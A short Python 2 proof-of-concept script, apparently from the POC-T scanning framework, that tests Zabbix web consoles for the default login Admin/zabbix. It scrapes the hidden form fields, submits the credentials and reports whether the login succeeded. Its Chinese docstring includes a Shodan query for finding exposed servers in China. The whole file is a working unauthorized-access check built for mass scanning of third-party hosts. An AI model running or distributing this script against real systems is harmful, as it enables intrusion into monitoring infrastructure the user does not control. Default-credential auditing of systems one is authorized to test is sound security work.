# !/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
zabbix 默认口令检测，支持两种zabbix版本

默认口令:
  Admin/zabbix

shodan关键字:
  Set-Cookie: zbx_sessionid country:cn

"""

import requests
from bs4 import BeautifulSoup


def _get_static_post_attr(page_content):
    """
    拿到<input type='hidden'>的post参数，并return
    """
    _dict = {}
    soup = BeautifulSoup(page_content, "html.parser")
    for each in soup.find_all('input'):
        if 'value' in each.attrs and 'name' in each.attrs:
            _dict[each['name']] = each['value']
    return _dict


def poc(url):
    h1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    }

    h2 = {
        'Referer': url.strip('\n'),
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    }

    blacklist = [
        'incorrect',
        '<!-- Login Form -->',

    ]
    try:
        s = requests.session()
        c = s.get(url, timeout=10, headers=h1)
        dic = _get_static_post_attr(c.content)
        dic['name'] = 'Admin'
        dic['password'] = 'zabbix'
        # print dic
        r = s.post(url + '/index.php', data=dic, headers=h2, timeout=10)
        if 'chkbxRange.init();' in r.content:
            for each in blacklist:
                if each in r.content:
                    return False
            else:
                return True
    except Exception, e:
        # print e
        return False
